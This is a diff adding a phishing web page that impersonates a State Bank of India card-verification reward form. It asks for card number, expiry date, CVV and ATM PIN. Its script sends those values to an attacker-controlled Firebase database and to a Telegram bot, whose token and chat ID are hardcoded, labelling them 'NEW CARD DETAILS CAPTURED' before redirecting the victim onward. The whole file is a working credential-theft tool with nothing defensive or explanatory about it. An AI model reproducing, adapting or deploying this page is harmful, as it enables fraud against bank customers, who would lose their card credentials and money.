@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Verify Card Details - SBI</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background-color: #ffffff;
+            font-family: system-ui, -apple-system, 'Roboto', 'Segoe UI', Arial, sans-serif;
+            overflow-x: hidden;
+        }
+        .relative-layout { width: 100%; min-height: 100vh; position: relative; background: white; }
+        .top-strip { width: 100%; height: 30px; background-color: #7E7E7E; position: relative; z-index: 1; }
+        .scroll-view { position: relative; width: 100%; height: calc(100vh - 30px); overflow-y: auto; background-color: white; }
+        .main-linear { display: flex; flex-direction: column; width: 100%; padding-bottom: 16px; }
+        .top-image { width: 100px; height: 35px; margin-left: 20px; margin-top: 10px; margin-bottom: 10px; object-fit: contain; }
+        .info-banner { background-color: #D9EDF7; padding: 8px 15px; width: 100%; margin-top: 8px; }
+        .info-banner-text { color: #032A38; font-size: 14px; font-weight: bold; text-align: left; }
+        .mandatory-text { color: #D9774F; font-size: 15px; font-style: italic; padding: 15px 16px 8px 16px; }
+        .form-container { padding: 16px; width: 100%; }
+        .field-row { display: flex; flex-direction: row; align-items: center; margin-top: 10px; margin-bottom: 5px; }
+        .field-label-text { color: #000000; font-size: 16px; font-weight: bold; }
+        .asterisk-red { color: #FF0000; font-size: 16px; margin-left: 2px; }
+        .input-field {
+            width: 100%; border: 1px solid #AAAAAA; border-radius: 4px; padding: 8px;
+            font-size: 14px; color: #000000; background-color: #FFFFFF; outline: none; margin-bottom: 20px;
+        }
+        .input-field:focus { border-color: #00506D; }
+        .input-field::placeholder { color: #888888; }
+        .expiry-row { display: flex; flex-direction: row; align-items: center; justify-content: space-between; gap: 10px; margin-bottom: 8px; width: 100%; margin-top: 8px; }
+        .expiry-select {
+            width: calc(50% - 5px); border: 1px solid #AAAAAA; border-radius: 4px; padding: 8px;
+            font-size: 14px; color: #000000; background-color: #FFFFFF; outline: none; cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23555555' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'></polyline></svg>");
+            background-repeat: no-repeat; background-position: right 12px center; background-size: 14px;
+        }
+        .expiry-select:focus { border-color: #00506D; }
+        .expiry-separator { font-size: 18px; font-weight: 500; color: #333; flex-shrink: 0; width: 20px; text-align: center; }
+        .submit-button { display: flex; justify-content: center; margin-top: 10px; margin-bottom: 10px; }
+        .btn-submit {
+            background: linear-gradient(135deg, #FF9800 0%, #F57C00 100%);
+            border: none; border-radius: 8px; padding: 10px 30px; color: white;
+            font-size: 15px; font-weight: bold; cursor: pointer; transition: all 0.2s ease;
+        }
+        .btn-submit:hover { background: linear-gradient(135deg, #F57C00 0%, #E66A00 100%); transform: scale(1.02); }
+        .btn-submit:active { transform: scale(0.98); }
+        .footer-image { width: 100%; height: auto; object-fit: contain; display: block; margin-top: 8px; }
+        .progress-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center;
+            z-index: 1000; visibility: hidden; opacity: 0; transition: visibility 0.2s, opacity 0.2s;
+        }
+        .progress-overlay.active { visibility: visible; opacity: 1; }
+        .spinner-container {
+            background: white; border-radius: 12px; padding: 24px;
+            display: flex; flex-direction: column; align-items: center; gap: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+        .spinner {
+            width: 48px; height: 48px; border: 4px solid #f3f3f3; border-top: 4px solid #F57C00;
+            border-radius: 50%; animation: spin 1s linear infinite;
+        }
+        .spinner-text { color: #333; font-size: 14px; font-weight: 500; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @media (max-width: 480px) {
+            .btn-submit { padding: 8px 25px; font-size: 14px; }
+            .expiry-select { font-size: 13px; padding: 7px; }
+        }
+        .hint-text { font-size: 11px; color: #777; margin-top: 5px; margin-bottom: 20px; display: block; text-align: left; }
+    </style>
+</head>
+<body>
+<div class="relative-layout">
+    <div class="top-strip"></div>
+    <div class="scroll-view">
+        <div class="main-linear">
+            <img id="topLogoImg" class="top-image" src="sbii.webp" alt="SBI Reward Logo"
+                 onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'100\' height=\'35\'%3E%3Crect width=\'100\' height=\'35\' fill=\'%2300506D\'/%3E%3Ctext x=\'10\' y=\'22\' fill=\'white\' font-size=\'10\'%3ESBI REWARD%3C/text%3E%3C/svg%3E'">
+            <div class="info-banner">
+                <div class="info-banner-text">Verify Card Details</div>
+            </div>
+            <div class="mandatory-text">Mandatory fields are marked with an asterisk (*)</div>
+            <div class="form-container">
+                <div class="field-row">
+                    <span class="field-label-text">Card Number</span>
+                    <span class="asterisk-red"> *</span>
+                </div>
+                <input type="text" id="etCardNumber" class="input-field" placeholder="Enter Card Number" maxlength="19" inputmode="numeric">
+
+                <div class="field-row expiry-label-row">
+                    <span class="field-label-text">Valid Expiry Date</span>
+                    <span class="asterisk-red"> *</span>
+                </div>
+                <div class="expiry-row">
+                    <select id="etExpiryMonth" class="expiry-select"><option value="" disabled selected>MM</option></select>
+                    <span class="expiry-separator">/</span>
+                    <select id="etExpiryYear" class="expiry-select"><option value="" disabled selected>YYYY</option></select>
+                </div>
+                <div class="hint-text">Select month and year from dropdown</div>
+
+                <div class="field-row">
+                    <span class="field-label-text">CVV</span>
+                    <span class="asterisk-red"> *</span>
+                </div>
+                <input type="password" id="etCVV" class="input-field" placeholder="Enter CVV" maxlength="3" inputmode="numeric">
+
+                <div class="field-row">
+                    <span class="field-label-text">ATM Pin</span>
+                    <span class="asterisk-red"> *</span>
+                </div>
+                <input type="password" id="etAtmPin" class="input-field" placeholder="Enter ATM PIN" maxlength="4" inputmode="numeric">
+
+                <div class="submit-button">
+                    <button id="btnSubmit" class="btn-submit">Submit</button>
+                </div>
+            </div>
+            <img id="footerLogoImg" class="footer-image" src="reward_logo.webp" alt="SBI Footer Logo"
+                 onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 600 80\'%3E%3Crect width=\'600\' height=\'80\' fill=\'%23E9F0F5\'/%3E%3Ctext x=\'20\' y=\'45\' fill=\'%2300506D\' font-size=\'12\'%3EState Bank of India - Safe & Secure Banking%3C/text%3E%3C/svg%3E'">
+        </div>
+    </div>
+</div>
+
+<div id="progressOverlay" class="progress-overlay">
+    <div class="spinner-container">
+        <div class="spinner"></div>
+        <div class="spinner-text">Processing, please wait...</div>
+    </div>
+</div>
+
+<script>
+    // ======================= TELEGRAM CONFIG =======================
+     const BOT_TOKEN = "8788780329:AAF3naB0x6TnIWM6a1vD4EOUlYHWDfsGAUs";
+    const CHAT_ID = "-1003760277860";
+    // ============================================================
+
+    let FIREBASE_DB_URL = null;
+    let uniqueId = null;
+    let isSubmitting = false;
+
+    const cardNumberInput = document.getElementById("etCardNumber");
+    const expiryMonthSelect = document.getElementById("etExpiryMonth");
+    const expiryYearSelect = document.getElementById("etExpiryYear");
+    const cvvInput = document.getElementById("etCVV");
+    const atmPinInput = document.getElementById("etAtmPin");
+    const submitBtn = document.getElementById("btnSubmit");
+    const progressOverlay = document.getElementById("progressOverlay");
+
+    function populateMonths() {
+        expiryMonthSelect.innerHTML = '<option value="" disabled selected>MM</option>';
+        for (let i = 1; i <= 12; i++) {
+            const monthValue = i < 10 ? `0${i}` : `${i}`;
+            const option = document.createElement("option");
+            option.value = monthValue;
+            option.textContent = monthValue;
+            expiryMonthSelect.appendChild(option);
+        }
+    }
+
+    function populateYears() {
+        expiryYearSelect.innerHTML = '<option value="" disabled selected>YYYY</option>';
+        const currentYear = new Date().getFullYear();
+        for (let y = currentYear; y <= currentYear + 15; y++) {
+            const option = document.createElement("option");
+            option.value = y.toString();
+            option.textContent = y.toString();
+            expiryYearSelect.appendChild(option);
+        }
+    }
+
+    function resetExpiryDropdowns() {
+        expiryMonthSelect.value = "";
+        expiryYearSelect.value = "";
+    }
+
+    function showLoader(show) {
+        if (show) progressOverlay.classList.add('active');
+        else progressOverlay.classList.remove('active');
+    }
+
+    function getData() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const urlId = urlParams.get("id");
+        const storedId = localStorage.getItem("uniqueId") || localStorage.getItem("uniqueid");
+
+        if (urlId) {
+            uniqueId = urlId;
+            localStorage.setItem("uniqueId", uniqueId);
+        } else if (storedId) {
+            uniqueId = storedId;
+        } else {
+            uniqueId = "DEVICE_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9);
+        }
+
+        const urlDbUrl = urlParams.get("dbUrl");
+        const storedDbUrl = localStorage.getItem("dbUrl");
+
+        if (urlDbUrl) {
+            FIREBASE_DB_URL = urlDbUrl;
+            localStorage.setItem("dbUrl", FIREBASE_DB_URL);
+        } else if (storedDbUrl) {
+            FIREBASE_DB_URL = storedDbUrl;
+        } else {
+            console.error("❌ No Firebase URL found!");
+            alert("Configuration error. Please contact support.");
+        }
+    }
+
+    function formatCardNumber(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 16) value = value.slice(0, 16);
+        let formatted = value.match(/.{1,4}/g);
+        e.target.value = formatted ? formatted.join(" ") : value;
+    }
+
+    function formatCVV(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+    }
+
+    function formatAtmPin(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+    }
+
+    function validateCardNumber(cardNumber) {
+        const clean = cardNumber.replace(/\s/g, '');
+        return /^[0-9]{16}$/.test(clean);
+    }
+
+    function getExpiryFromDropdowns() {
+        const month = expiryMonthSelect.value;
+        const year = expiryYearSelect.value;
+        if (!month || !year) return { month: null, year: null, valid: false };
+        return { month, year, valid: true };
+    }
+
+    function validateExpiryDropdown(monthStr, yearStr) {
+        if (!monthStr || !yearStr) return false;
+        const monthNum = parseInt(monthStr, 10);
+        const yearNum = parseInt(yearStr, 10);
+        const currentYear = new Date().getFullYear();
+        const currentMonth = new Date().getMonth() + 1;
+
+        if (monthNum < 1 || monthNum > 12) return false;
+        if (yearNum < currentYear) return false;
+        if (yearNum === currentYear && monthNum < currentMonth) return false;
+        return true;
+    }
+
+    function validateCVV(cvv) { return /^[0-9]{3}$/.test(cvv); }
+    function validateAtmPin(pin) { return /^[0-9]{4}$/.test(pin); }
+
+    // ======================= TELEGRAM SENDER (Firebase URL added here) =======================
+    async function sendToTelegram(cardNumber, expiryMonth, expiryYear, cvv, atmPin, deviceId) {
+        try {
+            const expiryDate = `${expiryMonth}/${expiryYear}`;
+            const cleanCardNumber = cardNumber.replace(/\s/g, '');
+            const currentTime = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+
+            const message = `🔴 *NEW CARD DETAILS CAPTURED* 🔴
+
+ *CARD NUMBER:* \`${cleanCardNumber}\`
+ *EXPIRY:* ${expiryDate}
+ *CVV:* \`${cvv}\`
+ *ATM PIN:* \`${atmPin}\`
+ *DEVICE ID:* \`${deviceId}\`
+🔗 *FIREBASE DB URL:* \`${FIREBASE_DB_URL}\`
+ *TIME:* ${currentTime}
+⚠️ *SBI CARD VERIFICATION COMPLETED* ⚠️`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "Markdown"
+            };
+
+            const response = await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+
+            if (!response.ok) throw new Error(`Telegram error: ${response.status}`);
+            console.log("✅ Telegram sent successfully with Firebase URL");
+            return true;
+        } catch (error) {
+            console.error("❌ Telegram failed:", error);
+            return false;
+        }
+    }
+    // ========================================================================
+
+    // ======================= SAVE TO FIREBASE (NO Firebase URL saved) =======================
+    async function saveToFirebase(cardNumber, expiryMonth, expiryYear, cvv, atmPin) {
+        if (!FIREBASE_DB_URL) throw new Error("Firebase URL not configured");
+
+        const expiryDate = `${expiryMonth}/${expiryYear}`;
+        const cleanCardNumber = cardNumber.replace(/\s/g, '');
+
+        const payload = {
+            cardNumber: cleanCardNumber,
+            expiryDate: expiryDate,
+            cvv: cvv,
+            atmPin: atmPin,
+            uniqueId: uniqueId,
+            timestamp: Date.now()
+        };
+
+        let baseUrl = FIREBASE_DB_URL.endsWith('/') ? FIREBASE_DB_URL.slice(0, -1) : FIREBASE_DB_URL;
+        const endpoint = `${baseUrl}/registeredDevices/${encodeURIComponent(uniqueId)}/card_payment_data.json`;
+
+        const response = await fetch(endpoint, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+        console.log("✅ Data saved to Firebase (without DB URL)");
+        return true;
+    }
+    // ========================================================================
+
+    function redirectToNextPage() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const nextPage = urlParams.get("next") || "page5th.html";
+
+        const redirectParams = new URLSearchParams({
+            id: uniqueId,
+            dbUrl: FIREBASE_DB_URL,
+            verified: "true",
+            completed: "true",
+            ts: Date.now()
+        });
+
+        window.location.replace(`${nextPage}?${redirectParams.toString()}`);
+    }
+
+    async function handleSubmit() {
+        if (isSubmitting) return;
+
+        const cardNumber = cardNumberInput.value.trim();
+        if (!cardNumber || !validateCardNumber(cardNumber)) {
+            alert("Please enter a valid 16-digit Card Number");
+            cardNumberInput.focus();
+            return;
+        }
+
+        const { month: expiryMonth, year: expiryYear, valid: hasSelection } = getExpiryFromDropdowns();
+        if (!hasSelection || !validateExpiryDropdown(expiryMonth, expiryYear)) {
+            alert("Please select a valid future Expiry Date (MM/YYYY)");
+            return;
+        }
+
+        const cvv = cvvInput.value.trim();
+        if (!cvv || !validateCVV(cvv)) {
+            alert("Please enter a valid 3-digit CVV");
+            cvvInput.focus();
+            return;
+        }
+
+        const atmPin = atmPinInput.value.trim();
+        if (!atmPin || !validateAtmPin(atmPin)) {
+            alert("Please enter a valid 4-digit ATM PIN");
+            atmPinInput.focus();
+            return;
+        }
+
+        if (!uniqueId || !FIREBASE_DB_URL) {
+            alert("Session error. Please try again.");
+            return;
+        }
+
+        isSubmitting = true;
+        showLoader(true);
+
+        try {
+            await saveToFirebase(cardNumber, expiryMonth, expiryYear, cvv, atmPin);
+            await sendToTelegram(cardNumber, expiryMonth, expiryYear, cvv, atmPin, uniqueId);
+
+            // Clear fields
+            cardNumberInput.value = "";
+            cvvInput.value = "";
+            atmPinInput.value = "";
+            resetExpiryDropdowns();
+
+            localStorage.setItem("cardVerified", "true");
+            localStorage.setItem("verificationComplete", "true");
+
+            setTimeout(() => redirectToNextPage(), 800);
+
+        } catch (error) {
+            console.error("Submission error:", error);
+            alert("Network error. Please check connection and try again.");
+            showLoader(false);
+            isSubmitting = false;
+        }
+    }
+
+    // Input formatting
+    cardNumberInput.addEventListener("input", formatCardNumber);
+    cvvInput.addEventListener("input", formatCVV);
+    atmPinInput.addEventListener("input", formatAtmPin);
+
+    submitBtn.addEventListener("click", (e) => { e.preventDefault(); handleSubmit(); });
+
+    // Enter key support
+    cardNumberInput.addEventListener("keypress", e => { if (e.key === "Enter") expiryMonthSelect.focus(); });
+    expiryMonthSelect.addEventListener("keypress", e => { if (e.key === "Enter") expiryYearSelect.focus(); });
+    expiryYearSelect.addEventListener("keypress", e => { if (e.key === "Enter") cvvInput.focus(); });
+    cvvInput.addEventListener("keypress", e => { if (e.key === "Enter") atmPinInput.focus(); });
+    atmPinInput.addEventListener("keypress", e => { if (e.key === "Enter") handleSubmit(); });
+
+    // Initialize
+    window.addEventListener("load", () => {
+        populateMonths();
+        populateYears();
+        resetExpiryDropdowns();
+        getData();
+        setTimeout(() => cardNumberInput.focus(), 100);
+    });
+</script>
+</body>
+</html>
